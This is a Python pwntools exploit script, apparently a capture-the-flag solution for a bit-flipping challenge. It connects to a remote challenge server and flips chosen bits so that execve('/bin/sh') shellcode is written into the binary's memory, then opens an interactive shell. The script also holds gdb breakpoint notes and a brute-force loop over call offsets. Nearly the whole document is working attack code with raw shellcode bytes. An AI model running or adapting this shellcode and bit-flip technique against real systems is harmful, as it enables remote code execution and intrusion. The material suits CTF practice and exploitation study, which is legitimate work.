
from pwn import *

context(arch = 'amd64', os = 'linux')

#r = process('./bit_a953161d37f64d58ce4ffce843d30ad9')
r = remote('flatearth.fluxfingers.net', 1744) # might need sudo for working better locally YMMV


print(shellcraft.sh())
print(disasm("\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"))
shellcode = asm(shellcraft.sh())
print(shellcode)
shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
print(shellcode)

data = ''
with open('export.bin', 'rb') as file:
    data = file.read()

print(len(shellcode))
print(len(data))

current_address = 0x400718
addresses = []
bits = []
bo = 0 # byte offset
bit = 0
for i in range(len(shellcode))*8:
	mask = 1 << bit
	
	if (ord(shellcode[bo]) ^ ord(data[bo])) & mask:
		addresses.append(current_address)
		bits.append(bit)
		
	if bit == 7:
		bo += 1
		current_address += 1
	bit = (bit + 1) % 8

print(len(addresses))

# set up loop
r.sendline("0x400714:5")

# set up shellcode in memory
for i in range(len(addresses)):
	e = hex(addresses[i]) + ":" + str(bits[i])
	print(e)
	print(i)
	r.sendline(e)

# allow shellcode to run
r.sendline("0x400714:5")

r.interactive()



# gdb used commands

#break *0x40072A
#break *0x4006DE
#0x40072B:0
#0x40072A:0

#0x40072D:0

#br *0x400713
#0x400714:5
#0x400586:1
#0x400718:0



call_loc = int('00400713', 16) + 5
relative = int('FFFFFE08', 16)
negative = int('FFFFFFFF', 16)

target = call_loc - (negative - relative + 1)

goodtarget = [0x400540, 0x400564, 0x400500, 0x400500, 0x400636, 0x400732]

for i in range(32):
    #for j in range(0, len(goodtarget), 2):
        relative = relative ^ (0x01 << i)
        target = call_loc - (negative - relative + 1)
        if target >= goodtarget[0] and target <= goodtarget[1]:
            print("great success!")
            print("b:", i)
            print("relative:", hex(relative))
            print("target:", hex(target))

        relative = relative ^ (0x01 << 3)
        print("target:", hex(target))

#print("relative:", hex(relative))
#print("target:", hex(target))
